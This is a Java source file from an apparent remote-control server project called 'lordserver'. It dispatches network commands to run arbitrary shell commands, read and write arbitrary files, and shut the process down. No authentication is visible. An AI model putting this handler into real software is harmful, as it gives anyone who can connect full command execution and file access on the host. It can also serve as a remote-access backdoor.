/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package lordserver;

/**
 *
 * @author carlosserrano
 */
public class Controller {
    public static void doTask(String[] request){
        String[] responseArray;
        String response;
        
        switch(request[0]){
            case "die":
                responseArray=new String[2];
                responseArray[0]="ok";
                responseArray[1]="Ha sido un placer servirle. Muero con honor";
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                UI.print("Hasta siempre");
                System.exit(0);
            case "execute":
                responseArray=new String[2];
                responseArray[0]="ok";
                responseArray[1]=Utils.execute(request[1]);
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                break;
            case "writeTXT":
                responseArray=new String[2];
                responseArray[0]="ok";
                responseArray[1]=Utils.writeTXT("LordToldme.txt",request[1].getBytes());
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                break;
            case "readTXT":
                responseArray=new String[2];
                responseArray[0]="ok";
                responseArray[1]=Utils.readTXT("LordToldme.txt");
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                break;
            case "writeFile":
                responseArray=new String[2];
                responseArray[0]="ok";
                responseArray[1]=Utils.writeFile(request[1],request[2]);
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                break;
            case "readFile":
                responseArray=new String[3];
                responseArray[0]="ok";
                String[] resultRead=Utils.readFile(request[1]);
                responseArray[1]=resultRead[0]; responseArray[2]=resultRead[1];
                response=Communication.setResponse(responseArray);
                Server.writeOut(response.getBytes());
                break; 
        }
    }
    
    
    
}
